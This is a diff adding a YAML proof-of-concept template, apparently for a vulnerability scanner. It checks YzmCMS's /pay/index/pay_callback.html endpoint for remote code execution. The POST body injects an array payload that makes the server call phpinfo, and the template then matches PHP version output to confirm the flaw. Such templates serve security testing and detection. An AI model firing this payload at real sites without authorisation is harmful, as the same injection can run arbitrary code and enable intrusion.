@@ -1,0 +1,21 @@
+name: poc-yaml-YzmCMS-pay_callback-RCE
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /pay/index/pay_callback.html
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
+    expression: response.status == 200 && response.body.bcontains(b'phpinfo()') && response.body.bcontains(b'PHP Version')
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140112191
